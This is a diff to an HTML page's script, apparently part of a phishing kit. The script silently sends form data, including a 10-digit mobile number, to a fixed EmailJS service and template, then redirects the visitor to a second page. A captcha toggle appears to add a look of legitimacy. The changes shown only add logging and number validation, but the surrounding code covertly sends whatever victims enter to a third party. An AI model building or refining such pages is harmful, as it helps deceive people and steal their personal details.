@@ -272,8 +272,8 @@ button:hover {
     </div>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
- // Initialize EmailJS
-// Initialize EmailJS
+
+       // Initialize EmailJS
 (function() {
     emailjs.init("Gjx15gLz2eH6G9gt2"); // Your public key
 
@@ -304,11 +304,14 @@ button:hover {
             // Send email silently using EmailJS
             emailjs.send('service_eg5xddf', 'template_cyjps0r', formData)
                 .then(function(response) {
+                    console.log('Email sent successfully:', response.status, response.text);
                     // On success, redirect to the second page
                     window.location.href = '2page.html'; // Redirect after successful email
                 }, function(error) {
                     console.error('Failed to send email:', error); // Handle any errors here
                 });
+        } else {
+            console.error('Mobile number must be exactly 10 digits.');
         }
     });
 
@@ -334,7 +337,7 @@ button:hover {
     imageCaptcha.addEventListener('change', updateCaptchaImage);
     audioCaptcha.addEventListener('change', updateCaptchaImage);
 })();
-
+ 
 
     </script>
  
